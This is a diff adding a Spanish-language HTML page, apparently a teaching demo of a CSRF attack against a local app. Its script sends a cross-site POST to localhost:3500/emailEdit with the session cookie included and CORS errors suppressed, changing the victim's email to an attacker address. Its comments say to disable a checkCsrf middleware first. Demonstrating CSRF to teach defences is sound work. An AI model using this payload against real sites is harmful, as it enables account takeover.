@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Ejemplo de un ataque csrf - Caso 2 sin redirect</title>
+</head>
+<body>
+
+<!--
+
+Nota: para ver el ejemplo desactive el middleware checkCsrf,
+o actívelo según su necesidad
+
+Esta es la url http://localhost:3500/emailEdit sensible a ataques  CSRF
+
+Correr este archivo en un servidor local, por ejemplo, usando: local-web-server
+https://www.npmjs.com/package/local-web-server
+
+-->
+
+<script>
+
+  fetch('http://localhost:3500/emailEdit', {
+    method: 'post',
+
+    // Se incluyen las credenciales (el SessionID) la cookie de sesión
+    credentials: 'include',
+
+    // Se oculta el mensaje de blocked by CORS policy de la consola del Browser
+    mode: 'no-cors',
+
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: 'email=atack@gmail.com'
+  })
+    .then(res => res.text())
+    .then(text => console.log(text))
+    .catch(err => console.log(err))
+
+</script>
+
+</body>
+</html>
